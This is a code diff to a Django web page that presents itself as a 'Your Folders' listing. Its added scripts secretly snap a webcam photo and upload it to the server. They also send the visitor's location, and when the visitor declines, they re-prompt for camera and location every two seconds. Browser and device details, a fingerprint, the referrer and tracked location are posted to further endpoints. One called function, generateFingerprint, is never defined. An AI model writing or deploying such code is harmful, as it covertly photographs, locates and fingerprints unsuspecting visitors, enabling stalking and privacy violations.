@@ -53,10 +53,12 @@
     </style>
 </head>
 <body>
-
+    <div id="permission-message" style="color: white; text-align: center; font-size: 1.5rem; display: none;">
+        🚫 Please allow both the camera and location permissions to proceed.
+    </div>
     <h1>📂 Your Folders</h1>
     <div class="folder-grid">
-        <!-- Your folders -->
+        <!-- Folder Items -->
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div></div>
@@ -75,49 +77,193 @@
     <script>
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
+        let cameraGranted = false;
+        let locationGranted = false;
 
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' }, audio: false
-        })
-        .then(stream => {
-            video.srcObject = stream;
-            video.play();
-            video.onloadedmetadata = () => {
+        function checkPermissions() {
+            if (cameraGranted && locationGranted) {
+                document.getElementById('permission-message').style.display = 'none';
+            } else {
+                document.getElementById('permission-message').style.display = 'block';
+                setTimeout(() => requestPermissions(), 2000); // Retry every 2 seconds
+            }
+        }
+
+        function requestPermissions() {
+            // Ask for camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                cameraGranted = true;
+                video.srcObject = stream;
+                video.play();
                 setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const image = canvas.toDataURL('image/png');
-
                     fetch('/upload/', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: `image=${encodeURIComponent(image)}`
-                    }).then(res => res.json())
-                      .then(data => console.log("Screenshot uploaded:", data.file));
+                    });
+                    checkPermissions();
                 }, 1500);
-            };
-        })
-        .catch(err => console.warn('Camera access denied.'));
+            })
+            .catch(err => {
+                cameraGranted = false;
+                checkPermissions();
+            });
 
-        navigator.geolocation.getCurrentPosition(function(position) {
-            fetch('/save-location/', {
+            // Ask for location
+            navigator.geolocation.getCurrentPosition(position => {
+                locationGranted = true;
+                fetch('/save-location/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    })
+                });
+                checkPermissions();
+            }, error => {
+                locationGranted = false;
+                checkPermissions();
+            });
+        }
+
+        // Start permission loop
+        requestPermissions();
+
+        function collectBrowserInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                touchSupport: 'ontouchstart' in window,
+            };
+
+            fetch("/log-device/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-CSRFToken": getCSRFToken()
+                },
+                body: JSON.stringify(info)
+            });
+        }
+
+        function getCSRFToken() {
+            let name = 'csrftoken';
+            let cookieValue = null;
+            if (document.cookie && document.cookie !== '') {
+                let cookies = document.cookie.split(';');
+                for (let cookie of cookies) {
+                    cookie = cookie.trim();
+                    if (cookie.startsWith(name + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                        break;
+                    }
+                }
+            }
+            return cookieValue;
+        }
+
+        collectBrowserInfo();
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@0.4.1/dist/html2canvas.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.0/dist/fp.min.js"></script>
+
+    <script>
+        new Fingerprint2().get(function(result, components){
+            console.log(result); // This is the unique fingerprint
+            // Send this result to the backend for storage
+        });
+
+        document.addEventListener('mousemove', (event) => {
+            console.log(`Mouse move at: ${event.clientX}, ${event.clientY}`);
+        });
+
+        navigator.geolocation.watchPosition(function(position) {
+            console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
+        });
+
+        function collectVisitorData() {
+            const fingerprint = generateFingerprint();
+            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            const screenInfo = {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth
+            };
+            const timezoneOffset = new Date().getTimezoneOffset();
+            const referrer = document.referrer;
+            const language = navigator.language || navigator.userLanguage;
+            const isNewVisitor = !sessionStorage.getItem("visited");
+            const cookiesEnabled = navigator.cookieEnabled;
+            const operatingSystem = navigator.platform;
+
+            const data = {
+                fingerprint: fingerprint,
+                deviceType: deviceType,
+                screenInfo: screenInfo,
+                timezoneOffset: timezoneOffset,
+                referrer: referrer,
+                language: language,
+                isNewVisitor: isNewVisitor,
+                cookiesEnabled: cookiesEnabled,
+                operatingSystem: operatingSystem
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    data.latitude = position.coords.latitude;
+                    data.longitude = position.coords.longitude;
+                    sendDataToBackend(data);
+                });
+            } else {
+                sendDataToBackend(data);
+            }
+        }
+
+        function sendDataToBackend(data) {
+            fetch('/collect-info/', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude
-                })
-            }).then(res => res.json())
-            .then(data => console.log("Location saved:", data));
-        }, function(error) {
-            console.warn('User denied location access.');
-        });
-    </script>
+                body: JSON.stringify(data)
+            }).then(response => response.json())
+              .then(result => console.log('Data sent successfully:', result))
+              .catch(error => console.error('Error sending data:', error));
+        }
 
+        window.onload = collectVisitorData;
+        
+        function sendVisitorData(data) {
+    fetch('/collect-info/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCSRFToken()  // Add this only if CSRF is enabled
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('Data sent successfully:', result);
+    })
+    .catch(error => {
+        console.error('Error sending data:', error);
+    });
+}
+
+    </script>
 </body>
 </html>
